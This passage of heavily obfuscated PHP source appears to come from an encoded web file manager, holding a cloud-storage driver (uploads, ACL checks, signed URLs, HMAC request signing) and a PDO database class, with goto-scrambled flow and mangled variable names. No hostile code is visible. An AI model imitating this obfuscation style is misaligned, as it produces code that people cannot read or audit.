$c†ö•á¨Ô­ = $b‚¥Û¾ö¯º = array(); goto DÄ‰ÅŠÎæØ; F¤³®˜¸¹°: } private function listObjs($A¤ªÔ§‰­¾, $C¹¿’İ÷ŠÁ = null, $fğÍÑ‘£¬÷ = null, $c£›«ïšÕ = null) { $BšŒëÒ—ŠË =& $_SERVER[òÀöí]; $A¤ªÔ§‰­¾ = trim($A¤ªÔ§‰­¾, $BšŒëÒ—ŠË[8]); $A¹˜‘ÎÃ = empty($A¤ªÔ§‰­¾) ? $BšŒëÒ—ŠË[33] : $A¤ªÔ§‰­¾ . $BšŒëÒ—ŠË[8]; return $this->client->getBucket($this->bucket, $A¹˜‘ÎÃ, $C¹¿’İ÷ŠÁ, $fğÍÑ‘£¬÷, $c£›«ïšÕ, !0); } public function has($DÌé˜ˆÅ§ , $cÖ§­ºš²õ = false, $aÌôçÚ·ï… = true) { goto EÍŞáÍœŒõ; EÍŞáÍœŒõ: $dµ¼«ò‘í =& $_SERVER[òÀöí]; $DÌé˜ˆÅ§  = trim($DÌé˜ˆÅ§ , $dµ¼«ò‘í[8]); $aÏ‰àçåõò = empty($DÌé˜ˆÅ§ ) ? $dµ¼«ò‘í[33] : $DÌé˜ˆÅ§  . $dµ¼«ò‘í[8]; goto B™—™±óÒ„; A÷ ¿ˆ„„½: return !1; goto EïØ‹‹Ú°; dÀªâÄƒ•: $B¯”„Ó‚Ä = $aã®ÆãÛâ´ = array(); while (!0) { $EƒáÕ…¶ÅÔ = $this->listObjs($DÌé˜ˆÅ§ , $c¡Ş£ÉË, $fÍÕ«ç´õ°, $b‚Ëì‹éšñ); if (!$EƒáÕ…¶ÅÔ) { break; } $c¡Ş£ÉË = $EƒáÕ…¶ÅÔ[$dµ¼«ò‘í[200]]; $E‘ÀÉ—¡ˆ× = $EƒáÕ…¶ÅÔ[$dµ¼«ò‘í[196]]; $eŒ„µŸøÓ‰ = $EƒáÕ…¶ÅÔ[$dµ¼«ò‘í[199]]; if (empty($E‘ÀÉ—¡ˆ×) && empty($eŒ„µŸøÓ‰)) { break; } if (count($E‘ÀÉ—¡ˆ×) == 1 && $E‘ÀÉ—¡ˆ×[0][$dµ¼«ò‘í[28]] == $aÏ‰àçåõò) { break; } if ($cÖ§­ºš²õ) { if (count($E‘ÀÉ—¡ˆ×)) { $E‘ÀÉ—¡ˆ× = array_column($E‘ÀÉ—¡ˆ×, $dµ¼«ò‘í[28]); $B¯”„Ó‚Ä = array_merge($B¯”„Ó‚Ä, $E‘ÀÉ—¡ˆ×); } if (count($eŒ„µŸøÓ‰)) { $eŒ„µŸøÓ‰ = array_column($eŒ„µŸøÓ‰, $dµ¼«ò‘í[28]); $aã®ÆãÛâ´ = array_merge($aã®ÆãÛâ´, $eŒ„µŸøÓ‰); } if ($c¡Ş£ÉË === null) { break; } continue; } if ($aÌôçÚ·ï…) { if (!empty($E‘ÀÉ—¡ˆ×)) { if (count($E‘ÀÉ—¡ˆ×) > 1 || isset($E‘ÀÉ—¡ˆ×[0][$dµ¼«ò‘í[28]]) && $E‘ÀÉ—¡ˆ×[0][$dµ¼«ò‘í[28]] != $aÏ‰àçåõò) { return !0; } } } else { if (!empty($eŒ„µŸøÓ‰)) { return !0; } } if ($c¡Ş£ÉË === null) { break; } } if ($cÖ§­ºš²õ) { $B¯”„Ó‚Ä = array_diff($B¯”„Ó‚Ä, array($aÏ‰àçåõò)); $B¯”„Ó‚Ä = count(array_unique($B¯”„Ó‚Ä)); $aã®ÆãÛâ´ = count(array_unique($aã®ÆãÛâ´)); return array($dµ¼«ò‘í[201] => $B¯”„Ó‚Ä, $dµ¼«ò‘í[202] => $aã®ÆãÛâ´); } goto A÷ ¿ˆ„„½; B™—™±óÒ„: $c¡Ş£ÉË = null; $fÍÕ«ç´õ° = 500; $b‚Ëì‹éšñ = $dµ¼«ò‘í[8]; goto dÀªâÄƒ•; EïØ‹‹Ú°: } public function listAll($E¼àø´ï’Å) { $AÌÛ×¾ ê =& $_SERVER[òÀöí]; $B«¬†§Úƒ» = $this->fileList($E¼àø´ï’Å, $AÌÛ×¾ ê[33], !0); $F·¨ËƒÎ¾œ = array(); foreach ($B«¬†§Úƒ»[$AÌÛ×¾ ê[73]] as $F¢Õ¯Œ¥Õ) { $F·¨ËƒÎ¾œ[$F¢Õ¯Œ¥Õ[$AÌÛ×¾ ê[28]]] = $F¢Õ¯Œ¥Õ[$AÌÛ×¾ ê[77]]; } foreach ($B«¬†§Úƒ»[$AÌÛ×¾ ê[74]] as $F¢Õ¯Œ¥Õ) { if (is_string($F¢Õ¯Œ¥Õ)) { $F·¨ËƒÎ¾œ[$F¢Õ¯Œ¥Õ] = 0; } } return $this->listAllFiles($E¼àø´ï’Å, array_keys($F·¨ËƒÎ¾œ), $F·¨ËƒÎ¾œ); } public function canRead($DŸ»æÏ¥ÇŸ) { $aš“¶¨ä¾ =& $_SERVER[òÀöí]; $BíåéÇª¾« = $this->client->getAccessControlPolicy($this->bucket, $DŸ»æÏ¥ÇŸ); if (!$BíåéÇª¾«) { return !1; } return in_array($BíåéÇª¾«, array($aš“¶¨ä¾[203], $aš“¶¨ä¾[204], $aš“¶¨ä¾[205])) ? !0 : !1; } public function canWrite($fÊ®“àÏäå) { $Dªƒßİ¤†’ =& $_SERVER[òÀöí]; $dŒÈÚç½˜’ = $this->client->getAccessControlPolicy($this->bucket, $fÊ®“àÏäå); if (!$dŒÈÚç½˜’) { return !1; } return in_array($dŒÈÚç½˜’, array($Dªƒßİ¤†’[203], $Dªƒßİ¤†’[204])) ? !0 : !1; } public function getContent($fÀîÄÌÑØÓ) { return $this->client->getObject($this->bucket, $fÀîÄÌÑØÓ); } public function setContent($Fñ‘ôå ôÛ, $dˆ›‹ÀßòÊ = '', $BÉ¹ÄËŞ×õ = false) { goto D˜çñÒŒ°Æ; D˜çñÒŒ°Æ: $EÕÉôĞää³ =& $_SERVER[òÀöí]; $Fñ‘ôå ôÛ = $BÉ¹ÄËŞ×õ ? trim($Fñ‘ôå ôÛ, $EÕÉôĞää³[8]) . $EÕÉôĞää³[8] : $Fñ‘ôå ôÛ; $cùÜÂÄó£… = get_file_mime(get_path_ext($Fñ‘ôå ôÛ)); goto aÙà£—½é´; Cõàê‹Œ²: $this->cacheMethod(null, null); $D½˜Î‹ŸøÔ = $this->copyFile($Fñ‘ôå ôÛ, $Fñ‘ôå ôÛ, array($EÕÉôĞää³[206] => $D½˜Î‹ŸøÔ[$EÕÉôĞää³[207]])); return $D½˜Î‹ŸøÔ ? !0 : !1; goto dâ»¿æ¨™å; aÙà£—½é´: $D½˜Î‹ŸøÔ = $this->client->putObject($dˆ›‹ÀßòÊ, $this->bucket, $Fñ‘ôå ôÛ, $EÕÉôĞää³[191], array(), $cùÜÂÄó£…); if (!$D½˜Î‹ŸøÔ) { return !1; } if ($BÉ¹ÄËŞ×õ) { return !0; } goto Cõàê‹Œ²; dâ»¿æ¨™å: } public function fileSubstr($bíî„¼ëÌæ, $BÁÍ²ƒÒ²ª, $fö°”¤•Ú) { $FÄÆŞÑÖí = $BÁÍ²ƒÒ²ª + $fö°”¤•Ú - 1; return $this->client->getObject($this->bucket, $bíî„¼ëÌæ, array($_SERVER[òÀöí][208] => "\x62\x79\x74\x65\163\x3d{$BÁÍ²ƒÒ²ª}\x2d{$FÄÆŞÑÖí}")); } public function upload($d‹ºóÜ‘Ğ, $E¶ÆØÚÇÕ«, $BãäÉ¹ìÄ± = false, $bï¿ñğº­² = REPEAT_REPLACE) { $cÑ»­ˆ©Ù¨ =& $_SERVER[òÀöí]; $eò¥Û›šĞ = array($cÑ»­ˆ©Ù¨[206] => @md5_file($E¶ÆØÚÇÕ«)); $Dá¾·Ö±á… = array($cÑ»­ˆ©Ù¨[209] => get_file_mime(get_path_ext($d‹ºóÜ‘Ğ))); if (IO::size($E¶ÆØÚÇÕ«) <= 1024 * 1024 * 200) { $aĞÆ… = $this->client->putObjectFile($E¶ÆØÚÇÕ«, $this->bucket, $d‹ºóÜ‘Ğ, $cÑ»­ˆ©Ù¨[191], $eò¥Û›šĞ, $Dá¾·Ö±á…); return !empty($aĞÆ…) ? $this->getPathOuter($d‹ºóÜ‘Ğ) : !1; } $e«§İ§å®³ = $this->client->multiUploadObject($E¶ÆØÚÇÕ«, $this->bucket, trim($d‹ºóÜ‘Ğ, $cÑ»­ˆ©Ù¨[8]), $eò¥Û›šĞ, $Dá¾·Ö±á…); return $e«§İ§å®³ ? $this->getPathOuter($d‹ºóÜ‘Ğ) : !1; } public function download($aÜ­Ø±æ´†, $c¤ãï­¡) { if (!@is_dir($this->pathFather($c¤ãï­¡)) && !IO::mkdir($this->pathFather($c¤ãï­¡))) { return !1; } $EŠ‹„³°« = $this->client->getObject($this->bucket, $aÜ­Ø±æ´†, array(), $c¤ãï­¡); return $EŠ‹„³°« !== !1 ? $c¤ãï­¡ : !1; } public function link($FÇĞˆ‰ãŞ, $CÔ¦è¾× = array()) { $c´›â²·ª© =& $_SERVER[òÀöí]; if ($this->signVer == $c´›â²·ª©[210]) { return $this->client->getAuthenticatedURL($this->bucket, $FÇĞˆ‰ãŞ, 3600 * 12, $CÔ¦è¾×); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($FÇĞˆ‰ãŞ, $c´›â²·ª©[8]), 3600 * 12, $this->region, array(), !0, $CÔ¦è¾×); } public function fileOut($dÛ‹ÀåŒ, $añœ™ˆË­¶ = false, $A·×²î” Ş = false, $c·’°¾²ÕÕ = '') { goto B”õ„ó¤àä; a’İÄŞ£˜: $DÈ½°êŞ„³ = get_file_mime(get_path_ext($A·×²î” Ş)); if ($DÈ½°êŞ„³ == $a¶ƒŸã‡”‘[211]) { return parent::fileOut($dÛ‹ÀåŒ, $añœ™ˆË­¶, $A·×²î” Ş, $c·’°¾²ÕÕ); } $añœ™ˆË­¶ = $añœ™ˆË­¶ ? $a¶ƒŸã‡”‘[212] : $a¶ƒŸã‡”‘[213]; goto FëàÏ‚ä‹¢; FëàÏ‚ä‹¢: $Aâ™”á‡æã = array($a¶ƒŸã‡”‘[214] => $añœ™ˆË­¶ . $a¶ƒŸã‡”‘[215] . rawurlencode($A·×²î” Ş), $a¶ƒŸã‡”‘[216] => $DÈ½°êŞ„³); $dŞ ß¿‚ã¦ = $this->link($dÛ‹ÀåŒ, $Aâ™”á‡æã); $this->fileOutLink($dŞ ß¿‚ã¦); goto fâŞ§Œ‹ÖÌ; B”õ„ó¤àä: $a¶ƒŸã‡”‘ =& $_SERVER[òÀöí]; if ($this->isFileOutServer()) { return $this->fileOutServer($dÛ‹ÀåŒ, $añœ™ˆË­¶, $A·×²î” Ş, $c·’°¾²ÕÕ); } if (!$A·×²î” Ş) { $A·×²î” Ş = $this->pathThis($dÛ‹ÀåŒ); } goto a’İÄŞ£˜; fâŞ§Œ‹ÖÌ: } public function fileOutServer($b­êÙ«ã›˜, $Aä†‚ëâª = false, $ağ¼‹Ö‹®â = false, $CªŸğ½ğ  = '') { parent::fileOut($b­êÙ«ã›˜, $Aä†‚ëâª, $ağ¼‹Ö‹®â, $CªŸğ½ğ ); } public function fileOutImageServer($DŒ‘İùİ¹ª, $e‚ù¤ºš¦¦ = 250) { parent::fileOutImage($DŒ‘İùİ¹ª, $e‚ù¤ºš¦¦); } public function hashMd5($D¨àìÍ‘«ó, $d—¼ï‡–óº = '') { $fŸ‡±§İŠŠ =& $_SERVER[òÀöí]; $bÄŒ¯Â™„— = $this->objectMeta($D¨àìÍ‘«ó); if (!$bÄŒ¯Â™„—) { return !1; } $d—¼ï‡–óº = $d—¼ï‡–óº ? $d—¼ï‡–óº : _get($bÄŒ¯Â™„—, $fŸ‡±§İŠŠ[217]); $d—¼ï‡–óº = $d—¼ï‡–óº ? $d—¼ï‡–óº : _get($bÄŒ¯Â™„—, $fŸ‡±§İŠŠ[207], $fŸ‡±§İŠŠ[33]); return $d—¼ï‡–óº; } public function uploadFormData($eÊµ¤¹Ì²›, $f›Û´•ÒÔÕ = 3600) { $A†Ğå’Õí¹ =& $_SERVER[òÀöí]; $aÅø­÷»ğÂ = $this->pathFather($eÊµ¤¹Ì²›); $f¯Ú­Š³é‰ = $this->client->getHttpUploadPostParams($this->bucket, $aÅø­÷»ğÂ, $A†Ğå’Õí¹[191], $f›Û´•ÒÔÕ); return array_merge((array) $f¯Ú­Š³é‰, array($A†Ğå’Õí¹[175] => $this->getHost())); } public function multiUploadFormData($C‰ÑÏœ», $C‚ğ¯™ÌÁ = 3600) { $E«§ºŒí×‹ =& $_SERVER[òÀöí]; $e¸»šªÑÀñ = gmdate($E«§ºŒí×‹[218]); $fÙÎÁ¼å = array(); $aŠÜÇÇˆÎ = $this->client->getUploadId($this->bucket, $C‰ÑÏœ», $fÙÎÁ¼å); if (!$aŠÜÇÇˆÎ) { return !1; } return array($E«§ºŒí×‹[219] => $aŠÜÇÇˆÎ, $E«§ºŒí×‹[175] => $this->getHost() . $E«§ºŒí×‹[8] . $this->pathEncode($C‰ÑÏœ»), $E«§ºŒí×‹[220] => $e¸»šªÑÀñ, $E«§ºŒí×‹[92] => $C‰ÑÏœ»); } public function multiUploadAuthData($cÖâİÖŞ÷ö, $C´‡ÎÄËˆ = array()) { goto A×¯˜ÍŒ³; CòïÔóºßù: $AÏéÚÅÁí… = $C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[92]]; unset($C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[92]]); if (isset($C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[221]])) { $C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[220]] = $eë§„™¶™Ê; return $this->listUploadParts($AÏéÚÅÁí…, $C´‡ÎÄËˆ); } goto b…É·‚ğŠ; A×¯˜ÍŒ³: $C…ŸÌ¿ã“ˆ =& $_SERVER[òÀöí]; $eë§„™¶™Ê = isset($C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[220]]) ? $C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[220]] : gmdate($C…ŸÌ¿ã“ˆ[218]); $FÃ‘¦§ §î = isset($C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[167]]) ? $C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[167]] : $C…ŸÌ¿ã“ˆ[33]; goto CòïÔóºßù; D¿Ê¹õÅ…Ò: $aÇÁà¼Õ = implode($C…ŸÌ¿ã“ˆ[227], $EÙ©¯ÜİÊ¢); $BïÍ‹òÌğ¶ = base64_encode(hash_hmac($C…ŸÌ¿ã“ˆ[228], $aÇÁà¼Õ, $this->secret, !0)); $D˜—µŞØ² = $C…ŸÌ¿ã“ˆ[229] . $this->accessKey . $C…ŸÌ¿ã“ˆ[4] . $BïÍ‹òÌğ¶; goto e—ôœ¼ˆè­; b…É·‚ğŠ: $EÙ©¯ÜİÊ¢ = array($C…ŸÌ¿ã“ˆ[222], $C…ŸÌ¿ã“ˆ[33], $C…ŸÌ¿ã“ˆ[118], $C…ŸÌ¿ã“ˆ[33], "\x78\x2d\x61\x6d\172\55\144\141\x74\x65\x3a{$eë§„™¶™Ê}", $C…ŸÌ¿ã“ˆ[8] . $this->bucket . $C…ŸÌ¿ã“ˆ[8] . $this->pathEncode($AÏéÚÅÁí…) . $FÃ‘¦§ §î); if (strpos($FÃ‘¦§ §î, $C…ŸÌ¿ã“ˆ[223]) === 0) { $EÙ©¯ÜİÊ¢[0] = $C…ŸÌ¿ã“ˆ[224]; } if (isset($C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[225]]) && $C´‡ÎÄËˆ[$C…ŸÌ¿ã“ˆ[225]] == $C…ŸÌ¿ã“ˆ[226]) { $EÙ©¯ÜİÊ¢[0] = $C…ŸÌ¿ã“ˆ[226]; } goto D¿Ê¹õÅ…Ò; e—ôœ¼ˆè­: if (strpos($FÃ‘¦§ §î, $C…ŸÌ¿ã“ˆ[223]) === 0) { return array($C…ŸÌ¿ã“ˆ[230] => $D˜—µŞØ², $C…ŸÌ¿ã“ˆ[220] => $eë§„™¶™Ê); } return $D˜—µŞØ²; goto cëç‹®ìˆ»; cëç‹®ìˆ»: } public function listUploadParts($F‚ğÎÍñ——, $BÊ‡Šã‚œ† = array()) { goto fÈâ¯š¢ƒò; fÈâ¯š¢ƒò: $EÄƒ¸Ã¶¶… =& $_SERVER[òÀöí]; $bƒ÷‰ÄğÈ´ = str_replace($EÄƒ¸Ã¶¶…[231], $EÄƒ¸Ã¶¶…[33], $BÊ‡Šã‚œ†[$EÄƒ¸Ã¶¶…[167]]); $AºôˆŸÊÇ = $this->client->listParts($this->bucket, $F‚ğÎÍñ——, $bƒ÷‰ÄğÈ´); goto DÙ«”ÃÈƒ™; bö¢Ş£Òö¿: $D¢¢•‰ŞÂ = $this->multiUploadAuthData($F‚ğÎÍñ——, $BÊ‡Šã‚œ†); if (empty($D¢¢•‰ŞÂ)) { return !1; } return array($EÄƒ¸Ã¶¶…[230] => $D¢¢•‰ŞÂ, $EÄƒ¸Ã¶¶…[220] => $BÊ‡Šã‚œ†[$EÄƒ¸Ã¶¶…[220]], $EÄƒ¸Ã¶¶…[232] => $AºôˆŸÊÇ); goto c õÏà˜´¿; DÙ«”ÃÈƒ™: if (!$AºôˆŸÊÇ) { return !1; } unset($BÊ‡Šã‚œ†[$EÄƒ¸Ã¶¶…[221]], $BÊ‡Šã‚œ†[$EÄƒ¸Ã¶¶…[225]]); $BÊ‡Šã‚œ†[$EÄƒ¸Ã¶¶…[92]] = $F‚ğÎÍñ——; goto bö¢Ş£Òö¿; c õÏà˜´¿: } public function getHost() { return parent::getHost() . $_SERVER[òÀöí][8] . $this->bucket; } public function size($fšÀõ˜—Ò) { $eï¼œÚéæÓ = $this->objectMeta($fšÀõ˜—Ò); return $eï¼œÚéæÓ ? $eï¼œÚéæÓ[$_SERVER[òÀöí][77]] : 0; } public function info($D¤¶Á¯ÌãÈ) { if ($this->isFolder($D¤¶Á¯ÌãÈ)) { return $this->folderInfo($D¤¶Á¯ÌãÈ); } else { if ($this->isFile($D¤¶Á¯ÌãÈ)) { return $this->fileInfo($D¤¶Á¯ÌãÈ); } } return !1; } public function exist($eß‡œ½¿µˆ) { return $this->isFile($eß‡œ½¿µˆ) || $this->isFolder($eß‡œ½¿µˆ); } public function isFile($cÅµ®¢Ç‚•) { return !$this->isFolder($cÅµ®¢Ç‚•) && $this->objectMeta($cÅµ®¢Ç‚•); } public function isFolder($dôŠĞ¥ŸÒÆ) { return $this->cacheMethod($_SERVER[òÀöí][197], $dôŠĞ¥ŸÒÆ); } protected function objectMeta($bÏí­·Ü) { return $this->cacheMethod($_SERVER[òÀöí][198], $bÏí­·Ü); } protected function _objectMeta($DÒ¼³¦Ÿ­) { $f²¤Æñ­« =& $_SERVER[òÀöí]; $DÒ¼³¦Ÿ­ = rtrim($DÒ¼³¦Ÿ­, $f²¤Æñ­«[8]); try { $bˆ‡ÁœÕ»ä = $this->client->getObjectInfo($this->bucket, $DÒ¼³¦Ÿ­); if (!isset($bˆ‡ÁœÕ»ä[$f²¤Æñ­«[217]]) && isset($bˆ‡ÁœÕ»ä[$f²¤Æñ­«[233]])) { $bˆ‡ÁœÕ»ä[$f²¤Æñ­«[217]] = $bˆ‡ÁœÕ»ä[$f²¤Æñ­«[233]]; } } catch (Exception $b’’Œ’Ñ) { $bˆ‡ÁœÕ»ä = !1; } if (!$bˆ‡ÁœÕ»ä) { } return $bˆ‡ÁœÕ»ä; } protected function _isFolder($FòäÜ¯Õò˜) { goto fŠº˜Áš“ä; fŠº˜Áš“ä: $aëÆ‡î·» =& $_SERVER[òÀöí]; $FòäÜ¯Õò˜ = rtrim($FòäÜ¯Õò˜, $aëÆ‡î·»[8]); if ($FòäÜ¯Õò˜ == $aëÆ‡î·»[33] || $FòäÜ¯Õò˜ == $aëÆ‡î·»[8]) { return !0; } goto dÇ¯µä¤; dÇ¯µä¤: $fÃøÎö×·‹ = $this->client->getBucket($this->bucket, $FòäÜ¯Õò˜, null, 1); if (empty($fÃøÎö×·‹[$aëÆ‡î·»[196]])) { return !1; } $F½«¸ŞŸŞµ = $fÃøÎö×·‹[$aëÆ‡î·»[196]][0][$aëÆ‡î·»[28]]; goto BÈŠ‰£‹×; BÈŠ‰£‹×: if (substr($F½«¸ŞŸŞµ, -1) == $aëÆ‡î·»[8]) { return !0; } if (get_path_this($F½«¸ŞŸŞµ) == get_path_this($FòäÜ¯Õò˜)) { return !1; } return !0; goto eµÙÔ§ÑàÚ; eµÙÔ§ÑàÚ: } } define($_SERVER[òÀöí][234], 1); goto Aˆ¿ä°£¶¨; D¡÷ê¿ÆÊæ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($f©ìöäö Û = '') { $d…»¬Ô° =& $_SERVER[òÀöí]; if (!class_exists($d…»¬Ô°[852])) { think_exception(think_lang($d…»¬Ô°[10]) . $d…»¬Ô°[853]); } if (!empty($f©ìöäö Û)) { $this->config = $f©ìöäö Û; if (empty($this->config[$d…»¬Ô°[13]])) { $this->config[$d…»¬Ô°[13]] = array(); } } } public function connect($e¸ÁøæÔÉ‡ = '', $d³ŸÔ‘§ˆÀ = 0) { $b¯‚¹Ä§‘¥ =& $_SERVER[òÀöí]; if (!isset($this->linkID[$d³ŸÔ‘§ˆÀ])) { goto D…ŠÄ°¡¿; fÆ¦ĞöÀ: try { $this->linkID[$d³ŸÔ‘§ˆÀ] = new PDO($e¸ÁøæÔÉ‡[$b¯‚¹Ä§‘¥[854]], $e¸ÁøæÔÉ‡[$b¯‚¹Ä§‘¥[827]], $e¸ÁøæÔÉ‡[$b¯‚¹Ä§‘¥[828]], $e¸ÁøæÔÉ‡[$b¯‚¹Ä§‘¥[13]]); } catch (PDOException $E‹ò–¢ÎÜ¯) { think_exception($E‹ò–¢ÎÜ¯->getMessage()); } $this->dbType = $this->_getDsnType($e¸ÁøæÔÉ‡[$b¯‚¹Ä§‘¥[854]]); if (in_array($this->dbType, array($b¯‚¹Ä§‘¥[855], $b¯‚¹Ä§‘¥[856], $b¯‚¹Ä§‘¥[857], $b¯‚¹Ä§‘¥[858]))) { think_exception($b¯‚¹Ä§‘¥[859] . $this->dbType . $b¯‚¹Ä§‘¥[860] . $this->dbType . $b¯‚¹Ä§‘¥[861]); } goto Fİà¹‰’ÌÜ; Fİà¹‰’ÌÜ: if (!$this->linkID[$d³ŸÔ‘§ˆÀ]) { think_exception($b¯‚¹Ä§‘¥[862]); } try { $this->linkID[$d³ŸÔ‘§ˆÀ]->exec($b¯‚¹Ä§‘¥[863] . think_config($b¯‚¹Ä§‘¥[830])); } catch (Exception $E‹ò–¢ÎÜ¯) { } $this->connected = !0; goto BÒÃø•ƒÀ‚; D…ŠÄ°¡¿: if (empty($e¸ÁøæÔÉ‡)) { $e¸ÁøæÔÉ‡ = $this->config; } $A¸‘øÙô´Œ = !empty($e¸ÁøæÔÉ‡[$b¯‚¹Ä§‘¥[13]][$b¯‚¹Ä§‘¥[14]]) ? $e¸ÁøæÔÉ‡[$b¯‚¹Ä§‘¥[13]][$b¯‚¹Ä§‘¥[14]] : $this->pconnect; if ($A¸‘øÙô´Œ) { $e¸ÁøæÔÉ‡[$b¯‚¹Ä§‘¥[13]][PDO::ATTR_PERSISTENT] = !0; } goto fÆ¦ĞöÀ; BÒÃø•ƒÀ‚: if (1 != think_config($b¯‚¹Ä§‘¥[18])) { unset($this->config); } goto cç‚î»´Ó»; cç‚î»´Ó»: } return $this->linkID[$d³ŸÔ‘§ˆÀ]; } public function free() { $this->PDOStatement = null; } public function query($A˜¢·¹¢ì¥, $FøÓƒ‹ˆŞ = array()) { goto AÈ¶­ßŸ’ã; d“ê»Ñ„Œ‡: $this->queryStr = $A˜¢·¹¢ì¥; if (!empty($FøÓƒ‹ˆŞ)) { $this->queryStr .= $E©ÙÅ«Ê™[864] . print_r($FøÓƒ‹ˆŞ, !0) . $E©ÙÅ«Ê™[865]; } if (!empty($this->PDOStatement)) { $this->free(); } goto E¾–Î®¹Îß; fÇŒÔ®‘É¥: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bÀÚïšˆ¶ = $this->PDOStatement->execute($FøÓƒ‹ˆŞ); $this->debug(); goto C¨‡º¤¬šŠ; AÈ¶­ßŸ’ã: $E©ÙÅ«Ê™ =& $_SERVER[òÀöí]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d“ê»Ñ„Œ‡; C¨‡º¤¬šŠ: if (!1 === $bÀÚïšˆ¶) { $this->error(); return !1; } else { return $this->getAll(); } goto d¬ñ˜ß¡ñ·; E¾–Î®¹Îß: think_action_status($E©ÙÅ«Ê™[19], 1); think_status($E©ÙÅ«Ê™[20]); $this->PDOStatement = $this->_linkID->prepare($A˜¢·¹¢ì¥); goto fÇŒÔ®‘É¥; d¬ñ˜ß¡ñ·: } public function execute($e†²ŒéÅ»Æ, $Dç’ğË›é = array()) { goto d´—¨ÅÜğÅ; d´—¨ÅÜğÅ: $F´õ®œÑ± =& $_SERVER[òÀöí]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aŞÓ¦×˜®; aŞÓ¦×˜®: $this->queryStr = $e†²ŒéÅ»Æ; if (!empty($Dç’ğË›é)) { $this->queryStr .= $F´õ®œÑ±[864] . print_r($Dç’ğË›é, !0) . $F´õ®œÑ±[865]; } $fİ¥Œá‚Ãä = !1; goto aËÊŞ“Õèã; f¦«‰è„áÆ: $eÌ¡©ÉŠœ = $this->PDOStatement->execute($Dç’ğË›é); $this->debug(); if (!1 === $eÌ¡©ÉŠœ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($fİ¥Œá‚Ãä || preg_match($F´õ®œÑ±[870], $e†²ŒéÅ»Æ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto E°Â“È…•ò; aËÊŞ“Õèã: if ($this->dbType == $F´õ®œÑ±[858]) { if (preg_match($F´õ®œÑ±[866], $this->queryStr, $Fà´›¤ğ)) { $this->table = think_config($F´õ®œÑ±[867]) . str_ireplace(think_config($F´õ®œÑ±[868]), $F´õ®œÑ±[370], $Fà´›¤ğ[2]); $fİ¥Œá‚Ãä = (bool) $this->query($F´õ®œÑ±[869] . strtoupper($this->table) . $F´õ®œÑ±[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($F´õ®œÑ±[21], 1); goto Cíµğõ•Ïï; Cíµğõ•Ïï: think_status($F´õ®œÑ±[20]); $this->PDOStatement = $this->_linkID->prepare($e†²ŒéÅ»Æ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto f¦«‰è„áÆ; E°Â“È…•ò: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D­îĞ¦˜×Œ = $this->_linkID->commit(); $this->transTimes = 0; if (!$D­îĞ¦˜×Œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÑ‡Š·±Öœ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FÑ‡Š·±Öœ) { $this->error(); return !1; } } return !0; } private function getAll() { $F¶ŠØºÎè = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($F¶ŠØºÎè); return $F¶ŠØºÎè; } public function getFields($Bëœåª‡ÖÛ) { goto fõŸìïÚ–Ä; d½Õ‹ïæ: $føÃ‰ù»è = $this->query($D¼âˆ‚¶Âö); $AŞË«»„¹ˆ = array(); if ($føÃ‰ù»è) { foreach ($føÃ‰ù»è as $AÀœì´ê¢ => $Cç“Éõá¿Ê) { $Cç“Éõá¿Ê = array_change_key_case($Cç“Éõá¿Ê); $Cç“Éõá¿Ê[$AãÈ‚îâ[28]] = isset($Cç“Éõá¿Ê[$AãÈ‚îâ[28]]) ? $Cç“Éõá¿Ê[$AãÈ‚îâ[28]] : $AãÈ‚îâ[370]; $Cç“Éõá¿Ê[$AãÈ‚îâ[29]] = isset($Cç“Éõá¿Ê[$AãÈ‚îâ[29]]) ? $Cç“Éõá¿Ê[$AãÈ‚îâ[29]] : $AãÈ‚îâ[370]; $AÍçÄõ°«° = isset($Cç“Éõá¿Ê[$AãÈ‚îâ[269]]) ? $Cç“Éõá¿Ê[$AãÈ‚îâ[269]] : $Cç“Éõá¿Ê[$AãÈ‚îâ[28]]; $AŞË«»„¹ˆ[$AÍçÄõ°«°] = array($AãÈ‚îâ[28] => $AÍçÄõ°«°, $AãÈ‚îâ[29] => $Cç“Éõá¿Ê[$AãÈ‚îâ[29]], $AãÈ‚îâ[31] => (bool) (isset($Cç“Éõá¿Ê[$AãÈ‚îâ[102]]) && $Cç“Éõá¿Ê[$AãÈ‚îâ[102]] === $AãÈ‚îâ[33] || isset($Cç“Éõá¿Ê[$AãÈ‚îâ[31]]) && $Cç“Éõá¿Ê[$AãÈ‚îâ[31]] === $AãÈ‚îâ[33]), $AãÈ‚îâ[34] => isset($Cç“Éõá¿Ê[$AãÈ‚îâ[34]]) ? $Cç“Éõá¿Ê[$AãÈ‚îâ[34]] : (isset($Cç“Éõá¿Ê[$AãÈ‚îâ[53]]) ? $Cç“Éõá¿Ê[$AãÈ‚îâ[53]] : $AãÈ‚îâ[370]), $AãÈ‚îâ[36] => isset($Cç“Éõá¿Ê[$AãÈ‚îâ[92]]) ? strtolower($Cç“Éõá¿Ê[$AãÈ‚îâ[92]]) == $AãÈ‚îâ[38] : (isset($Cç“Éõá¿Ê[$AãÈ‚îâ[54]]) ? $Cç“Éõá¿Ê[$AãÈ‚îâ[54]] : !1), $AãÈ‚îâ[39] => 